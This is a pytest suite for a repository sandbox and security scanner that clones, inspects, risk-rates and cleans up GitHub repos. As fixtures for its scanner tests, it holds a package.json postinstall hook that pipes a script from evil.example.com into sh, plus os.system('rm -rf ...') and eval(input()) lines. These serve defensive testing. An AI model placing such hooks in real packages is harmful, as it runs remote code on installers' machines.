from __future__ import annotations

import json
import os
import shutil
import tempfile
from pathlib import Path
from types import SimpleNamespace

import pytest

from src.evaluation.models import RepoEvaluation
from src.github.models import RepoData
from src.sandbox import fs_utils
from src.sandbox.errors import SandboxLimitExceeded
from src.sandbox.fs_utils import SANDBOX_ROOT, iter_files, safe_rmtree
from src.sandbox.manifest_detection import detect_commands, detect_license, detect_manifests
from src.sandbox.models import SandboxMode, SandboxResult, SandboxStatus
from src.sandbox.sandbox_manager import SandboxManager
from src.sandbox.security_scan import scan_security

PROJECT_ROOT = Path(__file__).resolve().parents[3]
TEST_REPO_URL = "https://github.com/octocat/Hello-World"


def _evaluation(**overrides) -> RepoEvaluation:
    base = dict(
        name="octocat/Hello-World",
        url=TEST_REPO_URL,
        overall_score=85.0,
        architecture_score=80.0,
        activity_score=80.0,
        community_score=90.0,
        license_score=100.0,
        security_score=90.0,
        compatibility_score=100.0,
        maintenance_score=80.0,
        relevance_score=85.0,
        recommendation="ÖNERİLİR",
        suitable_for_jarvis=True,
        target_module="src/agents/browser_agent.py",
        integration_difficulty="Düşük",
        risk_level="LOW",
    )
    base.update(overrides)
    return RepoEvaluation(**base)


def _make_fixture_repo(tmp_path: Path, **files: str) -> str:
    """Klonlama YAPMADAN, yerel bir sandbox-benzeri dizin kurar — analiz
    aşamalarını (inspect/detect_manifests/scan_security/...) ağdan
    bağımsız, hızlı ve deterministik test etmek için."""

    for relative_path, content in files.items():
        full_path = tmp_path / relative_path
        full_path.parent.mkdir(parents=True, exist_ok=True)
        full_path.write_text(content, encoding="utf-8")
    return str(tmp_path)


# --- 1) Güvenli küçük gerçek repo: clone -> inspect -> rapor -> cleanup -------


class TestRealSmallRepoLifecycle:
    def test_clone_inspect_report_cleanup(self, tmp_path, monkeypatch):
        source = tmp_path / "fixture-source"
        _make_fixture_repo(source, **{
            "README.md": "# deterministic repository fixture",
            "requirements.txt": "requests==2.32.0\n",
            "LICENSE": "MIT License\n",
            "src/main.py": "def main():\n    return 'ok'\n",
        })
        clone_calls = []

        def fake_git_clone(command, **kwargs):
            assert command[0] == "git" and "clone" in command and command[-2] == TEST_REPO_URL
            clone_calls.append(list(command))
            shutil.copytree(source, Path(command[-1]), dirs_exist_ok=True)
            return SimpleNamespace(returncode=0, stdout="", stderr="")

        monkeypatch.setattr("src.sandbox.sandbox_manager.subprocess.run", fake_git_clone)
        monkeypatch.setattr("socket.create_connection", lambda *a, **k: pytest.fail("network access attempted"))
        manager = SandboxManager(max_repo_size_mb=20.0, max_files=2000, clone_timeout_seconds=60)
        evaluation = _evaluation()

        result = manager.run_pipeline(TEST_REPO_URL, evaluation)

        try:
            assert result.status == SandboxStatus.READY_FOR_REVIEW, result.error
            assert result.mode == SandboxMode.STATIC_ANALYSIS
            assert result.sandbox_path is not None
            assert os.path.isdir(result.sandbox_path)
            # "Rapor": SandboxResult'un kendisi rapor niteliğinde olmalı.
            assert result.files_scanned > 0
            assert result.total_size_mb >= 0.0
            assert result.recommended_action
            assert result.findings
            assert len(clone_calls) == 1

            # Ana proje klasörüne dokunulmadığını doğrula.
            sandbox_path = Path(result.sandbox_path).resolve()
            assert PROJECT_ROOT not in sandbox_path.parents
            assert str(sandbox_path).startswith(str(SANDBOX_ROOT.resolve()))
        finally:
            cleaned = manager.cleanup(result)
            assert cleaned.status == SandboxStatus.CLEANED
            assert not os.path.exists(result.sandbox_path)


# --- 2) Geçersiz GitHub URL: kontrollü hata -----------------------------------


class TestInvalidUrl:
    def setup_method(self):
        self.manager = SandboxManager()

    @pytest.mark.parametrize("bad_url", [
        "", "not-a-url", "ftp://github.com/octocat/Hello-World",
        "https://gitlab.com/octocat/Hello-World",
        "https://github.com/octocat",  # repo adı eksik
        "javascript:alert(1)",
    ])
    def test_create_rejects_invalid_url_without_raising(self, bad_url):
        result = self.manager.create(bad_url)
        assert result.status == SandboxStatus.FAILED
        assert result.error is not None
        assert result.sandbox_path is None

    def test_run_pipeline_rejects_invalid_url_without_raising(self):
        result = self.manager.run_pipeline("not-a-valid-url", _evaluation())
        assert result.status == SandboxStatus.FAILED
        assert "Geçersiz GitHub URL" in (result.error or "")


# --- 3) Çok büyük repo simülasyonu: limit nedeniyle BLOCKED -------------------


class TestSizeLimitEnforcement:
    def test_pre_clone_size_hint_blocks_before_cloning(self, tmp_path):
        manager = SandboxManager(max_repo_size_mb=1.0)
        result = manager.create(TEST_REPO_URL)
        blocked = manager.clone_repository(result, size_hint_mb=5000.0)

        assert blocked.status == SandboxStatus.BLOCKED
        assert not os.path.exists(blocked.sandbox_path)  # klonlama hiç başlamadı

    def test_post_clone_measurement_blocks_oversized_fixture(self, tmp_path):
        # Gercek clone yerine yerel bir "sahte klon" dizini kurup, cok
        # dusuk bir dosya/boyut siniriyla post-clone olcumu tetikliyoruz.
        fixture = tmp_path / "oversized-repo"
        fixture.mkdir()
        for i in range(10):
            (fixture / f"file_{i}.txt").write_text("x" * 1000, encoding="utf-8")

        with pytest.raises(SandboxLimitExceeded):
            list(iter_files(str(fixture), max_files=3, max_bytes=10_000_000))

        with pytest.raises(SandboxLimitExceeded):
            list(iter_files(str(fixture), max_files=1000, max_bytes=500))


# --- 4) Symlink içeren repo simülasyonu: takip edilmemeli ---------------------


class TestSymlinkHandling:
    def test_iter_files_skips_symlinked_file(self, tmp_path, monkeypatch):
        real_file = tmp_path / "real.txt"
        real_file.write_text("normal content", encoding="utf-8")
        fake_link = tmp_path / "link.txt"
        fake_link.write_text("should not be read as normal file", encoding="utf-8")

        original_is_link = fs_utils.is_link

        def fake_is_link(path: str) -> bool:
            if os.path.abspath(path) == os.path.abspath(str(fake_link)):
                return True
            return original_is_link(path)

        monkeypatch.setattr(fs_utils, "is_link", fake_is_link)

        found = {os.path.basename(p) for p, _size in iter_files(str(tmp_path), max_files=100, max_bytes=10_000_000)}
        assert "real.txt" in found
        assert "link.txt" not in found  # symlink olarak isaretlenen dosya atlandi

    def test_iter_files_does_not_descend_into_symlinked_directory(self, tmp_path, monkeypatch):
        real_dir = tmp_path / "real_dir"
        real_dir.mkdir()
        (real_dir / "inside.txt").write_text("data", encoding="utf-8")

        linked_dir = tmp_path / "linked_dir"
        linked_dir.mkdir()
        (linked_dir / "secret.txt").write_text("should not be scanned", encoding="utf-8")

        original_is_link = fs_utils.is_link

        def fake_is_link(path: str) -> bool:
            if os.path.abspath(path) == os.path.abspath(str(linked_dir)):
                return True
            return original_is_link(path)

        monkeypatch.setattr(fs_utils, "is_link", fake_is_link)

        found_names = {os.path.basename(p) for p, _size in iter_files(str(tmp_path), max_files=100, max_bytes=10_000_000)}
        assert "inside.txt" in found_names
        assert "secret.txt" not in found_names


# --- 5) Şüpheli install scripti: risk bulgusu oluşturmalı ---------------------


class TestSuspiciousInstallScript:
    def test_postinstall_curl_pipe_detected(self, tmp_path):
        package_json = json.dumps({
            "name": "malicious-pkg",
            "version": "1.0.0",
            "scripts": {"postinstall": "curl http://evil.example.com/payload.sh | sh"},
        })
        fixture = _make_fixture_repo(tmp_path, **{"package.json": package_json})

        scan = scan_security(fixture, max_files=100, max_bytes=10_000_000)

        assert any("postinstall" in p for p in scan.suspicious_patterns)
        assert any("curl" in p for p in scan.suspicious_patterns)
        assert scan.network_risk == "HIGH"
        assert scan.dependency_risk == "HIGH"
        assert "package.json" in scan.suspicious_files

    def test_os_system_and_eval_detected_in_python_file(self, tmp_path):
        fixture = _make_fixture_repo(
            tmp_path,
            **{"setup_hook.py": "import os\nos.system('rm -rf /tmp/x')\neval(input())\n"},
        )
        scan = scan_security(fixture, max_files=100, max_bytes=10_000_000)
        assert any("os.system" in p for p in scan.suspicious_patterns)
        assert any("eval" in p for p in scan.suspicious_patterns)
        assert scan.execution_risk == "HIGH"

    def test_clean_repo_has_low_risk_and_no_suspicious_files(self, tmp_path):
        fixture = _make_fixture_repo(
            tmp_path,
            **{"main.py": "def add(a, b):\n    return a + b\n", "README.md": "# Clean project\n"},
        )
        scan = scan_security(fixture, max_files=100, max_bytes=10_000_000)
        assert scan.network_risk == "LOW"
        assert scan.execution_risk == "LOW"
        assert scan.dependency_risk == "LOW"
        assert scan.suspicious_patterns == []


# --- 6) Lisansı belirsiz repo: çalıştırma önerilmemeli ------------------------


class TestUnclearLicense:
    def test_missing_license_file_detected_as_empty(self, tmp_path):
        fixture = _make_fixture_repo(tmp_path, **{"main.py": "print('hi')\n"})
        assert detect_license(fixture) == ""

    def test_evaluate_risk_warns_when_license_unclear(self, tmp_path):
        fixture = _make_fixture_repo(tmp_path, **{"main.py": "print('hi')\n"})
        manager = SandboxManager()

        result = SandboxResult(
            repository_name="octocat/no-license-repo",
            repository_url="https://github.com/octocat/no-license-repo",
            sandbox_path=fixture,
            status=SandboxStatus.ANALYZING,
        )
        result = manager.inspect(result)
        result = manager.detect_manifests(result)
        result = manager.detect_commands(result)
        result = manager.scan_security(result)
        result = manager.evaluate_risk(result)

        assert result.license_detected == ""
        assert "lisans belirsiz" in result.recommended_action
        assert "ÖNERİLMEZ" in result.recommended_action

    def test_isolated_execution_downgraded_when_license_unclear(self, tmp_path):
        fixture = _make_fixture_repo(tmp_path, **{"main.py": "print('hi')\n"})
        manager = SandboxManager()

        result = SandboxResult(
            repository_name="octocat/no-license-repo",
            repository_url="https://github.com/octocat/no-license-repo",
            sandbox_path=fixture,
            status=SandboxStatus.ANALYZING,
            mode=SandboxMode.ISOLATED_EXECUTION,
        )
        result = manager.detect_manifests(result)
        result = manager.scan_security(result)
        result = manager.evaluate_risk(result)

        assert result.mode == SandboxMode.STATIC_ANALYSIS


# --- 7) HIGH risk Evaluation sonucu: clone öncesinde reddedilmeli -------------


class TestHighRiskEvaluationRejectedBeforeClone:
    def test_high_risk_blocks_before_any_directory_created(self):
        manager = SandboxManager()
        high_risk_eval = _evaluation(risk_level="HIGH", suitable_for_jarvis=False, recommendation="ÖNERİLMEZ")

        result = manager.run_pipeline(TEST_REPO_URL, high_risk_eval)

        assert result.status == SandboxStatus.BLOCKED
        assert result.sandbox_path is None  # create()/clone_repository() hic cagirilmadi

    def test_unsuitable_blocks_before_clone(self):
        manager = SandboxManager()
        unsuitable = _evaluation(suitable_for_jarvis=False, recommendation="ÖNERİLMEZ")
        result = manager.run_pipeline(TEST_REPO_URL, unsuitable)
        assert result.status == SandboxStatus.BLOCKED
        assert result.sandbox_path is None

    def test_low_relevance_blocks_before_clone(self):
        manager = SandboxManager()
        low_relevance = _evaluation(relevance_score=40.0)
        result = manager.run_pipeline(TEST_REPO_URL, low_relevance)
        assert result.status == SandboxStatus.BLOCKED
        assert result.sandbox_path is None


# --- 8) Sandbox temizleme: yalnızca kendi geçici klasörünü silmeli -----------


class TestCleanupIsolation:
    def test_safe_rmtree_refuses_paths_outside_sandbox_root(self, tmp_path):
        outside_path = tmp_path / "not_a_sandbox_dir"
        outside_path.mkdir()
        (outside_path / "important.txt").write_text("do not delete me", encoding="utf-8")

        with pytest.raises(SandboxLimitExceeded):
            safe_rmtree(str(outside_path))

        assert outside_path.exists()  # silinmedi

    def test_safe_rmtree_refuses_project_root(self):
        with pytest.raises(SandboxLimitExceeded):
            safe_rmtree(str(PROJECT_ROOT))

    def test_cleanup_only_removes_its_own_sandbox_directory(self):
        manager = SandboxManager()
        result_a = manager.create(TEST_REPO_URL)
        result_b = manager.create("https://github.com/octocat/Spoon-Knife")

        os.makedirs(result_a.sandbox_path, exist_ok=True)
        os.makedirs(result_b.sandbox_path, exist_ok=True)
        marker_a = Path(result_a.sandbox_path) / "marker.txt"
        marker_b = Path(result_b.sandbox_path) / "marker.txt"
        marker_a.write_text("a", encoding="utf-8")
        marker_b.write_text("b", encoding="utf-8")

        try:
            manager.cleanup(result_a)
            assert not os.path.exists(result_a.sandbox_path)
            assert os.path.exists(result_b.sandbox_path)  # digeri etkilenmedi
        finally:
            safe_rmtree(result_b.sandbox_path)


# --- Manifest/komut tespiti (destekleyici birim testler) ----------------------


class TestManifestAndCommandDetection:
    def test_detects_required_four_manifests(self, tmp_path):
        fixture = _make_fixture_repo(
            tmp_path,
            **{
                "requirements.txt": "requests\n",
                "pyproject.toml": "[project]\nname='x'\n",
                "package.json": json.dumps({"name": "x", "scripts": {"test": "jest"}}),
                "Dockerfile": "FROM python:3.12\n",
            },
        )
        manifests = detect_manifests(fixture)
        for expected in ("requirements.txt", "pyproject.toml", "package.json", "Dockerfile"):
            assert expected in manifests

    def test_commands_are_suggestions_only_and_never_executed(self, tmp_path):
        fixture = _make_fixture_repo(tmp_path, **{"requirements.txt": "flask\n"})
        manifests = detect_manifests(fixture)
        install_cmds, test_cmds = detect_commands(fixture, manifests)
        assert "pip install -r requirements.txt" in install_cmds
        assert "pytest" in test_cmds
        # Bu fonksiyon saf bir string uretecidir; hicbir subprocess/os.system
        # cagrisi icermez (kod incelemesiyle de dogrulanabilir).


# --- 9) Mevcut GitHub/Evaluation testleri: regresyon olmadan geçmeli ----------
# (Bu paket src/github veya src/evaluation'daki hicbir dosyayi degistirmedi;
# regresyon kontrolu ayri bir pytest calistirmasiyla yapilir — bkz. rapor.)
